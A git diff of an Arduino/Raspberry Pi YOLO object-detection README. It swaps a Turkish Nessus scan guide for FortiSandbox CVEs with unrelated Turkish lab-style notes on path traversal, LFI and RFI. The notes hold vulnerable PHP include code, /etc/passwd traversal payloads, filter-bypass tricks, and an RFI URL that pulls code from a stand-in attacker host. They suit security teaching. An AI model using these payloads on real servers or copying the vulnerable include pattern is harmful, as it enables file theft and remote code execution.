@@ -29,35 +29,82 @@ This project focuses on object detection using Arduino, Raspberry Pi 4, and the 
 The YOLO model files are stored externally due to size constraints. Download them from the following link:
 [Download YOLO Models](https://drive.google.com/file/d/1YHB8XA6gKgN_wgjmSJKbKTTeveajuWFH/view)
 
-Nessus ile Doğrulama ve Politika Yapılandırması
-Bu bölümde, tespit edilen zafiyetlerin (CVE-2026-39808 ve CVE-2026-39813) Nessus güvenlik tarayıcısı kullanılarak nasıl doğrulanacağı ve tarama sırasında izlenmesi gereken metodoloji açıklanmaktadır.
+ 
+# File Inclusion
+**Path Traversal (Directory Traversal),** bir web uygulamasında ortaya çıkan ve saldırganın sunucu üzerindeki dosyalara yetkisiz şekilde erişmesine imkân veren bir güvenlik açığıdır. Normalde bir kullanıcı yalnızca uygulamanın izin verdiği klasörlerdeki dosyalara erişebilmelidir. Ancak bu zafiyet sayesinde saldırgan, uygulamanın kök dizininin dışına çıkarak işletim sistemine ait hassas dosyaları bile okuyabilir.
+Bu zafiyet genellikle kullanıcıdan alınan bir girdinin (örneğin URL parametresi) doğrudan dosya okuma fonksiyonlarına verilmesiyle ortaya çıkar. Asıl sorun, verilen kullanıcı girdisinin yeterince doğrulanmamasıdır. Yani uygulama, “kullanıcı gerçekten izin verilen bir dosyayı mı istiyor?” kontrolünü yapmazsa açık oluşur.
+Path Traversal zafiyeti, kullanıcıdan alınan dosya yolu bilgisinin kontrol edilmeden kullanılması sonucu ortaya çıkar. Saldırgan bu durumu kullanarak uygulamanın erişmemesi gereken dosyalara ulaşabilir. Bu yüzden geliştiricilerin, kullanıcı girdilerini mutlaka doğrulaması ve erişilebilecek dosya yollarını sınırlandırması gerekir.
 
-6.1. Doğrulama Yaklaşımı
-Söz konusu zafiyetlerin doğrulanmasında Nessus, aktif istismar (exploit) yöntemleri yerine sürüm ve servis tespiti (version-based detection) metodolojisini kullanmaktadır. Bu süreçte tarayıcı; cihaz tipini tanımlar, çalışan yazılım sürümünü belirler ve elde edilen veriyi bilinen CVE veritabanı ile eşleştirerek risk durumunu raporlar.
+**Local File Inclusion (LFI)**, bir web uygulamasının sunucu üzerindeki dosyaları sayfanın içine dahil etmesi (include etmesi) sırasında oluşan bir güvenlik açığıdır. Yani uygulama, kullanıcıdan aldığı bir parametreye göre hangi dosyanın gösterileceğine karar veriyorsa ve bu parametre kontrol edilmiyorsa, saldırgan istediği dosyayı yükletebilir.
+Bu durum özellikle PHP’de çok sık görülür çünkü PHP’de include, require gibi fonksiyonlar başka dosyaları doğrudan sayfanın içine ekler. Normalde bu fonksiyonlar, geliştiricinin belirlediği güvenli dosyaları çağırmak için kullanılır. Ancak kullanıcı girdisi doğrudan bu fonksiyonlara verilirse ciddi bir risk oluşur. 
+include($_GET["lang"]);
+Burada uygulama, URL’deki lang parametresine göre bir dosya açıyor. Normal kullanımda:
+index.php?lang=EN.php
+index.php?lang=AR.php
+şeklinde çalışır ve kullanıcı dil seçimi yapar.
+Ancak burada hiçbir kontrol olmadığı için saldırgan şunu diyebilir:
+index.php?lang=/etc/passwd
+Eğer sunucu izin veriyorsa, bu dosya doğrudan sayfanın içine dahil edilir ve içeriği kullanıcıya gösterilir. Bu, sistemdeki hassas bilgilerin sızmasına yol açar.
 
-6.2. Tarama Politikası (Scan Policy) Konfigürasyonu
-Doğru bir tespit için Nessus üzerinde "Basic Network Scan" şablonu temel alınarak aşağıdaki kritik yapılandırmalar uygulanmalıdır:
+aşağıdaki örnekte geliştirici biraz daha güvenli olduğunu düşünerek dosya yolunu sabitlemiş:
+include("languages/" . $_GET['lang']);
+Yani sadece languages klasörü içinden dosya alınsın istemiş. Normal kullanım:
+index.php?lang=EN.php
+→ languages/EN.php yüklenir.
+Ama yine input kontrolü yoksa saldırgan bu sınırlamayı aşabilir. Burada devreye yine Path Traversal girer. Saldırgan ../ kullanarak üst dizinlere çıkabilir:
+index.php?lang=../../../../etc/passwd
+Bu durumda uygulama aslında şunu çalıştırır:
+languages/../../../../etc/passwd
+ve bu yol çözülürken sistem:
+/etc/passwd
+dosyasına ulaşır.
 
-Port ve Servis Tespiti: Cihazın yönetim arayüzlerine erişim sağlayan 443 (HTTPS) ve 80 (HTTP) portları öncelikli olmak üzere standart TCP port taraması aktif edilmelidir. "Service Detection" modülü, FortiSandbox servisinin doğru tanımlanması için açık tutulmalıdır.
+Buradaki önemli fark şudur:
+Path Traversal’da sen sadece dosya yolunu manipüle edersin ve uygulama o dosyayı okur. Yani amaç genelde içerik sızdırmaktır. Örneğin /etc/passwd gibi bir dosyanın içeriğini görürsün.
+LFI (Local File Inclusion)’da ise uygulama bir dosyayı include gibi bir fonksiyonla sayfanın içine dahil eder. Bu şu anlama gelir: o dosya, sanki uygulamanın bir parçasıymış gibi işlenir.
+Yani LFI’de dosya sadece okunmaz, sayfanın parçası haline gelir. Bu yüzden etkisi daha büyük olabilir.
 
-Plugin Yapılandırması: Tarama sırasında; Web Servers, CGI Abuses, Service Detection ve Fortinet Appliance Detection kategorisindeki plugin'lerin aktif olduğundan emin olunmalıdır. Bu plugin'ler, cihazın imzasını ve CVE eşleşmelerini analiz eder.
+##LFI Filter Bypass Techniques
 
-Kimlik Bilgisi (Credentials): İlgili zafiyetlerin tespiti için kimlik bilgisi kullanımı zorunlu değildir. "Unauthenticated Scan" (Kimlik bilgisiz tarama) yöntemi, dışarıdan sürüme bağlı risk tespiti yapmak için yeterlidir.
+**Null Byte Injection Bypass (%00)**
+Uygulama, kullanıcıdan aldığı parametreyi sabit bir dizin (languages/) ve sabit bir uzantı (.php) ile birleştirerek dosya yolu oluşturmaktadır. Bu durum, dizin geçişi (directory traversal) ile uygulama dizini dışına çıkılmasına imkân tanır. Ancak doğrudan /etc/passwd gibi dosyalar çağrılmak istendiğinde, uygulamanın otomatik olarak .php eklemesi nedeniyle erişim başarısız olur (languages/../../../../etc/passwd.php). Bu kısıtlama, eski PHP sürümlerinde Null Byte (%00) kullanılarak aşılabilmekteydi. %00 karakteri string sonlandırıcı olarak yorumlandığı için sonradan eklenen .php uzantısı etkisiz hale getirilebilmekteydi. Modern sistemlerde bu yöntem geçerliliğini yitirmiştir.
+**
+Dot Slash / Current Directory Bypass (/. tekniği)**
+Bu yöntem, dosya sistemi çözümleme mantığından faydalanır. Uygulama belirli anahtar kelimeleri (örneğin /etc/passwd) filtrelemeye çalışsa bile, dosya yollarına eklenen /. ifadesi aynı dizini temsil eder ve hedef dosyanın değişmeden kalmasını sağlar. Örneğin /etc/passwd/. ifadesi, işletim sistemi tarafından yine /etc/passwd olarak yorumlanır. Bu teknik, özellikle basit string filtrelemelerinin uygulandığı durumlarda, filtreyi bozmadan hedefe ulaşmayı mümkün kılar.
 
-Güvenli Tarama (Safe Checks): Üretim ortamındaki cihazın sürekliliğini korumak adına "Safe Checks" ayarı mutlaka aktif edilmelidir.
+**Path Traversal Obfuscation Bypass (....// tekniği)**
+Bu yöntemin temelinde eksik veya hatalı uygulanan filtreleme mekanizması bulunmaktadır. Uygulama ../ ifadelerini kaldırarak dizin geçişini engellemeye çalışsa da, bu işlem genellikle tek seferlik (single-pass) yapılır. Saldırgan, ....// gibi özel olarak hazırlanmış ifadeler kullanarak bu filtreyi aşabilir. Filtre ilk ../ benzeri pattern’i temizledikten sonra kalan ifade yeniden yorumlandığında geçerli bir dizin geçişine dönüşür. Bu teknik, filtreleme işleminin yeterince derin uygulanmamasından kaynaklanan bir zafiyeti hedef alır.
 
-6.3. Uygulama ve Analiz Süreci
-Tarama işlemi tamamlandıktan sonra elde edilen sonuçlar aşağıdaki kriterlere göre analiz edilir:
+ 
 
-Beklenen Bulgular: Nessus raporunda cihazın "FortiSandbox" olarak tanımlanması ve etkilenen sürüm aralıklarından birinin (4.4.0–4.4.8 veya 5.0.0–5.0.5) raporlanması beklenmektedir.
 
-CVE Referansları: Rapor çıktısında CVE-2026-39808 ve CVE-2026-39813 kodlarının doğrudan referans gösterilmesi, zafiyetin varlığını kanıtlar.
+**Prefix Enforcement Bypass (Zorunlu dizin ekleme bypass)**
+Bu yöntemde uygulama, kullanıcı girdisinin belirli bir dizinle başlamasını zorunlu kılar (örneğin languages/). Amaç, erişimi yalnızca belirli bir klasörle sınırlandırmaktır. Ancak bu kontrol, dizin geçişi ile aşılabilir. Kullanıcı girdisine gerekli prefix eklendikten sonra ../ kullanılarak bu dizinden çıkış yapılır. Örneğin languages/../../../../../etc/passwd gibi bir ifade hem uygulamanın beklediği formatı sağlar hem de hedef dosyaya erişim imkânı tanır. Bu durum, yalnızca prefix kontrolüne dayalı güvenlik önlemlerinin yetersiz olduğunu göstermektedir.
 
-Doğrulama Durumu: Sistem sürümü zafiyetli aralıkta yer alıyor ve Nessus çıktısı bu sürümü "Kritik" olarak işaretliyorsa, bulgu teknik olarak doğrulanmış kabul edilir.
 
-6.4. Sonuç ve Önemli Notlar
-Nessus tarafından gerçekleştirilen bu işlem, zafiyetin varlığını sürüm bazlı (evidence-based) olarak kanıtlar; ancak gerçek bir exploit testi gerçekleştirmez. Bu nedenle Nessus çıktıları, sızma testi raporlarında ön doğrulama kanıtı olarak sunulmalı ve gerek görüldüğü takdirde kontrollü ortamlarda gerçekleştirilen manuel testlerle desteklenmelidir.
+# Remote File İnclusion (RFI)
 
-Rapor Özeti: Zafiyet doğrulama sürecinde Nessus tarayıcısı kullanılmıştır. Yapılan analiz sonucunda hedef sistemin FortiSandbox ürününe ait etkilenen sürümleri çalıştırdığı tespit edilmiş ve ilgili bulgular CVE referansları ile eşleştirilmiştir. Bu tespit, zafiyetlerin sistem üzerinde potansiyel olarak istismar edilebilir olduğunu teknik verilerle ortaya koymaktadır.
+Remote File Inclusion (RFI), web uygulamasının kullanıcıdan aldığı girdiyi yeterli doğrulama ve filtreleme mekanizmalarından geçirmeden include() veya benzeri dosya dahil etme fonksiyonlarında kullanması sonucu ortaya çıkan bir güvenlik zafiyetidir. Bu zafiyet, saldırganın uygulamaya yerel dosyalar yerine uzak bir sunucuda barındırdığı dosyaları dahil ettirmesine olanak tanır.
+RFI zafiyetinin oluşabilmesi için, hedef sistemde PHP yapılandırmasında allow_url_fopen veya benzeri uzaktan dosya erişimine izin veren ayarların aktif olması gerekmektedir. Bu ayar aktif olduğunda, include() fonksiyonu yalnızca yerel dosyaları değil, HTTP/HTTPS gibi protokoller üzerinden erişilebilen uzak dosyaları da işleyebilmektedir.
+
+**Çalışma Mekanizması**
+RFI saldırısı, istemci ve sunucu arasındaki veri akışının manipüle edilmesine dayanır. Uygulama, kullanıcıdan aldığı parametreyi doğrudan bir URL olarak işleyebildiği durumlarda, saldırgan kendi kontrolündeki bir sunucuda zararlı içerik barındırarak bu içeriği hedef uygulamaya dahil ettirebilir.
+Tipik bir saldırı senaryosu şu şekilde gerçekleşir:
+1.	Saldırgan, kendi kontrolündeki bir sunucuda zararlı bir dosya barındırır.
+Örneğin:
+<?php echo "Hello THM"; ?>
+2.	Hedef uygulamaya, bu dosyayı işaret eden bir URL parametre olarak gönderilir:
+http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
+3.	Uygulama, bu girdiyi doğrudan include() fonksiyonuna iletir. 
+4.	Hedef sunucu, saldırganın sunucusuna bir HTTP isteği göndererek ilgili dosyayı çeker. 
+5.	Çekilen dosya uygulama içerisinde çalıştırılır ve çıktısı kullanıcıya döndürülür. 
+Bu süreç sonucunda, saldırganın sağladığı kod hedef sunucu üzerinde çalıştırılmış olur.
+**Etkileri ve Riskler**
+RFI zafiyeti, LFI zafiyetine kıyasla daha yüksek risk taşımaktadır. Bunun temel nedeni, saldırganın doğrudan kendi kontrolündeki kodu çalıştırabilmesidir. Bu durum aşağıdaki güvenlik risklerine yol açabilir:
+•	Remote Code Execution (RCE): Sunucu üzerinde uzaktan komut çalıştırma imkânı 
+•	Hassas Bilgi Sızıntısı: Sunucu üzerindeki kritik verilerin ifşa edilmesi 
+•	Cross-Site Scripting (XSS): Zararlı istemci tarafı kodların enjekte edilmesi 
+•	Denial of Service (DoS): Hizmetin kesintiye uğratılması
+•	RFI zafiyetinin temel nedeni, kullanıcı girdisinin doğrudan ve kontrolsüz şekilde dosya dahil etme mekanizmasına aktarılmasıdır. Özellikle URL tabanlı kaynaklara erişimin aktif olduğu ortamlarda, bu durum ciddi güvenlik açıklarına yol açmaktadır. Güvenli bir uygulama tasarımında, kullanıcı girdisinin doğrudan dosya yolu veya URL olarak kullanılmaması, katı doğrulama ve beyaz listeleme (whitelisting) yöntemlerinin uygulanması gerekmektedir.
 
 
